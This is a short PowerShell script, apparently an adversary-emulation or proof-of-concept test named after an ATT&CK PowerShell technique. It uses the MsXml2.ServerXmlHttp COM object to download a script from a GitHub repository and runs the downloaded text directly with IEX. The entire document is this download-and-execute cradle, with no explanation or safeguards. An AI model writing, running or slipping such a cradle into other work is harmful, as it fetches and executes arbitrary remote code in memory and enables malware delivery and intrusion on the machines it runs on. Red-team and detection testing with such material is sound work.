$url = 'https://github.com/nicovarvara/mw-poc/raw/refs/heads/main/test-atomic-T1059.001.ps1'
$method = 'GET'
$comObject = 'MsXml2.ServerXmlHttp'
$comMsXml=New-Object -ComObject $comObject
$comMsXml.Open($method, $url, $False)
$comMsXml.Send()
IEX $comMsXml.ResponseText
